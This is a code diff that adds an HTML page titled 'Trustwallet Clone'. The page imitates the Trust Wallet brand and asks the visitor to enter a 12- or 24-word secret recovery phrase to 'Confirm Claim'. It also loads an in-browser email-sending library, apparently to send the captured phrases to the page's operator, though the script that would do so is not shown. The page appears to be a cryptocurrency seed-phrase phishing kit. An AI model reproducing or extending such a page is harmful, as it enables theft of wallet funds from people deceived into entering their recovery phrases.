@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/8f06bb057c.js"
+      crossorigin="anonymous"
+    ></script>
+
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="media.css" />
+    <title>Trustwallet Clone</title>
+  </head>
+  <body>
+    <header>
+      <img src="images/trustlogo.png" alt="" />
+    </header>
+    <section class="section">
+      <div class="div-line">
+        <div></div>
+        <div></div>
+      </div>
+      <div class="connect-coin">
+        <img src="images/eth.png" alt="" />
+        <div></div>
+        <div></div>
+      </div>
+      <div class="connect-content">
+        <h1>Connect with Secret Phrase</h1>
+      </div>
+      <div class="options">
+        <select name="" id="inputSelector" onchange="updateInputFields()">
+          <option value="12">I have 12-word phrase</option>
+          <option value="24">I have 24-word phrase</option>
+        </select>
+      </div>
+      <form action="" autocomplete="off">
+        <div id="inputContainer"></div>
+        <button type="button" id="myButton">Connect To Confirm Claim</button>
+      </form>
+    </section>
+    <script src="app.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  </body>
+</html>
